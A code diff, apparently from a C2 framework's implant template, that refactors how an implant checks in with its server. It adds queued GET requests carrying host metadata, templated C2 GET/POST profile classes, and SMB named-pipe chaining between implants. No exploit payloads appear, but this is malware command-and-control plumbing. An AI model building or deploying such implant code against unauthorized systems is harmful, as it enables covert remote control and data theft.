@@ -5,8 +5,9 @@
 #include "protocols/json/json.h"
 #include "core/settings.h"
 #include "comms/smb.h"
-#include "data/transforms/transforms.h"
+#include <optional>
 #include "modules/metadata.h"
+#include "comms/queues.h"
 
 // ==========================================================
 // BASE INTERFACES
@@ -21,8 +22,8 @@ public:
 	// Universal for a sleep time, or someting like a pipe that waits
 	virtual HANDLE get_wait_handle() = 0;
 	//func to get our task
-	virtual nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) = 0;
-
+	virtual nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) = 0;
+    virtual nlohmann::json get(std::string implant_uuid) = 0; 
     //protected = only members/children can use
 protected:
     std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
@@ -52,9 +53,9 @@ protected:
 
 class IEgressTransport {
 public:
-    virtual ~IEgressTransport() = default;
-    //func to send response
-    virtual void send_response(const std::string& uuid, const nlohmann::json& task_response_array) = 0;
+	virtual ~IEgressTransport() = default;
+	//func to send response
+	virtual void send_response(const std::string& uuid, const nlohmann::json& task_response_array) = 0;
 
 protected:
     std::vector<uint8_t> pack_to_msgpack(const nlohmann::json& json_data) {
@@ -97,7 +98,12 @@ public:
         return NULL;
     }
 
-	nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) override {
+	nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) override {
+        /*
+        Creates the get task for THIS implant. 
+        
+        */
+
         //Note - moved logic of msgpack/metadata to this, instead of inside of each transport
         //method. This keeps everythign cleaner/less tied together
         nlohmann::json metadata = nlohmann::json();
@@ -107,24 +113,51 @@ public:
         if (full_metadata) {
             metadata = populate_metadata();
         }
-
         //add implant uuid to data
         metadata["implant_uuid"] = uuid;
+        return metadata;
+
+	}
+    nlohmann::json get(std::string implant_uuid) {
+        /*
+        Gathers all queued GET requests, and yeets them off to the server in an
+        array.
+
+        Then, we get the task array back, and return them.
         
-        //pack metadata
-        metadata_as_msgpack = this->pack_to_msgpack(metadata);
+        */
+        //get all items in queue for sending back to server
+        nlohmann::json get_array = GetQueue::drain_queue();
+
+        //check if we are registered. if not, include metadata
+        bool populate_this_implants_metadata = true; //temp enable, settings ebing dumb
+        //if (SettingsManager::instance().get<int>("registered", 1) != 1) {
+        //    bool populate_this_implants_metadata = true;
+        //}
+
+        //add our own checkin here
+        nlohmann::json this_implants_get = this->create_get_request(implant_uuid, populate_this_implants_metadata);
+        get_array.push_back(this_implants_get);
+
+        std::cout << "CHECKIN DATA -> SERVER" << std::endl;
+        std::cout << get_array.dump(4) << std::endl;
+
+        //to msgpack
+        std::vector<uint8_t> get_as_msgpack;
+        get_as_msgpack = this->pack_to_msgpack(get_array);
 
         //send checkin
-        std::vector<uint8_t> response = [[ c2_get_profile.value ]](metadata_as_msgpack);
-        
+        std::vector<uint8_t> response = [[ c2_get_profile.value ]](get_as_msgpack);
+
         nlohmann::json task_array = nlohmann::json::array();
         if (!response.empty()) {
-            //unpack response
+            //unpack response, add to array
+            //note, don't push back, this comes in as [{},{}...]
             task_array = this->unpack_to_json(response);
         }
 
         return task_array;
-	}
+    }
 
 };
 
@@ -134,13 +167,11 @@ public:
 
 class [[ c2_post_profile.value ]]_class : public IEgressTransport {
 public:
-    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
-        
+	void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
         std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
 
 		[[ c2_post_profile.value ]](uuid, task_response_msgpack_list);
-        
-    }
+	}
 };
 
 [%- endfor %]
@@ -155,162 +186,57 @@ public:
 // // ==========================================================
 
 //hardcoded, for dev
-
 class PipeIngress : public IIngressTransport {
 private:
     HANDLE h_inbox_;
-    OVERLAPPED ol_;
-    HANDLE h_event_;
-
-    // The buffer MUST be a class member so it stays alive while Windows 
-    // writes to it in the background during the cycle() wait.
-    std::vector<uint8_t> async_buffer_;
-    bool is_reading_;
-
-    // Helper to kick off the background read
-    void arm_next_read() {
-        if (is_reading_) return;
-
-        DWORD bytes_read = 0;
-        memset(async_buffer_.data(), 0, async_buffer_.size()); // Clear old data
-
-        // Issue the async read
-        BOOL success = ReadFile(
-            h_inbox_,
-            async_buffer_.data(),
-            static_cast<DWORD>(async_buffer_.size()),
-            &bytes_read,
-            &ol_
-        );
-
-        if (!success && GetLastError() == ERROR_IO_PENDING) {
-            // Perfect. Windows is reading in the background. 
-            // The ol_.hEvent will signal when it's done.
-            is_reading_ = true;
-        }
-        else if (success) {
-            // Data was instantly available. The event is already signaled.
-            is_reading_ = true;
-        }
-        else {
-            // Pipe broken or parent disconnected
-            std::cerr << "[-] Pipe read error: " << GetLastError() << std::endl;
-        }
-    }
+    HANDLE h_outbox_;
 
 public:
-    PipeIngress(HANDLE h) : h_inbox_(h), is_reading_(false) {
-        memset(&ol_, 0, sizeof(OVERLAPPED));
-        h_event_ = CreateEventW(NULL, TRUE, FALSE, NULL);
-        ol_.hEvent = h_event_;
-
-        // Pre-allocate a large enough buffer (e.g., 1mb)
-        async_buffer_.resize(1024 * 1024);
-
-        // KICK OFF THE FIRST READ so the cycle() loop has something to wait for
-        arm_next_read();
-    }
-
-    ~PipeIngress() {
-        if (h_event_) CloseHandle(h_event_);
+    PipeIngress(HANDLE h_in, HANDLE h_out) : h_inbox_(h_in), h_outbox_(h_out) {
     }
 
     HANDLE get_wait_handle() override {
-        return h_event_;
+        return NULL;
     }
 
-    nlohmann::json fetch_task(const std::string& uuid, bool full_metadata = false) override {
-        // If we are here, WaitForMultipleObjects signaled that our read finished!
-        DWORD bytes_transferred = 0;
+    nlohmann::json create_get_request(const std::string& implant_uuid, bool full_metadata = false) override {
+        nlohmann::json metadata = nlohmann::json();
+        if (full_metadata) {
+            metadata = populate_metadata();
+        }
+        metadata["implant_uuid"] = implant_uuid;
+        return metadata;
+    }
 
-        // Get the actual result of the read we kicked off earlier
-        if (!GetOverlappedResult(h_inbox_, &ol_, &bytes_transferred, FALSE)) {
-            // Parent disconnected or pipe error
-            ResetEvent(h_event_);
-            is_reading_ = false;
-            return nlohmann::json();
+    nlohmann::json get(std::string implant_uuid) override {
+        nlohmann::json get_array = GetQueue::drain_queue();
+        get_array.push_back(this->create_get_request(implant_uuid, true));
+
+        std::vector<uint8_t> get_as_msgpack = this->pack_to_msgpack(get_array);
+
+        // DELEGATE TO NAMESPACE
+        std::vector<uint8_t> raw_response = SMB::Child::fetch_tasks(h_inbox_, h_outbox_, get_as_msgpack);
+
+        if (!raw_response.empty()) {
+            return this->unpack_to_json(raw_response);
         }
 
-        // We have our data! 
-        std::vector<uint8_t> raw_data(async_buffer_.begin(), async_buffer_.begin() + bytes_transferred);
-
-        // Reset the event and arm the NEXT read immediately so we don't miss incoming data
-        ResetEvent(h_event_);
-        is_reading_ = false;
-        arm_next_read();
-
-        // Parse and return
-        if (raw_data.empty()) {
-            return nlohmann::json();
-        }
-
-        try {
-            return nlohmann::json::from_msgpack(raw_data);
-        }
-        catch (...) {
-            return nlohmann::json();
-        }
+        return nlohmann::json();
     }
 };
-
 
 class PipeEgress : public IEgressTransport {
 private:
     HANDLE h_outbox_;
-    OVERLAPPED ol_;
-    HANDLE h_event_;
 
 public:
     PipeEgress(HANDLE h) : h_outbox_(h) {
-        memset(&ol_, 0, sizeof(OVERLAPPED));
-        h_event_ = CreateEventW(NULL, TRUE, FALSE, NULL);
-        ol_.hEvent = h_event_;
-    }
-
-    ~PipeEgress() {
-        if (h_event_) CloseHandle(h_event_);
     }
 
     void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
-
         std::vector<uint8_t> batched_data = this->pack_to_msgpack(task_response_array);
 
-        if (batched_data.empty() || h_outbox_ == INVALID_HANDLE_VALUE) {
-            return;
-        }
-
-        DWORD bytes_written = 0;
-        ResetEvent(h_event_);
-
-        // 1. Issue the asynchronous write
-        BOOL success = WriteFile(
-            h_outbox_,
-            batched_data.data(),
-            static_cast<DWORD>(batched_data.size()),
-            &bytes_written,
-            &ol_
-        );
-
-        // 2. Handle the Overlapped state
-        if (!success && GetLastError() == ERROR_IO_PENDING) {
-            // CRITICAL: The 4th parameter is TRUE.
-            // This blocks the thread just long enough for Windows to finish copying
-            // batched_data to the kernel. This prevents the vector from being destroyed
-            // while Windows is still trying to read it.
-            if (!GetOverlappedResult(h_outbox_, &ol_, &bytes_written, TRUE)) {
-                std::cerr << "[-] Pipe write failed after pending: " << GetLastError() << std::endl;
-            }
-            else {
-                std::cout << "[+] Asynchronously sent " << bytes_written << " bytes." << std::endl;
-            }
-        }
-        else if (!success) {
-            // Pipe broke or parent C2 disconnected
-            std::cerr << "[-] Immediate pipe write error: " << GetLastError() << std::endl;
-        }
-        else {
-            // Success immediately (buffer was small enough to write instantly)
-            std::cout << "[+] Instantly sent " << bytes_written << " bytes." << std::endl;
-        }
+        // DELEGATE TO NAMESPACE
+        SMB::Child::send_data(h_outbox_, batched_data);
     }
 };
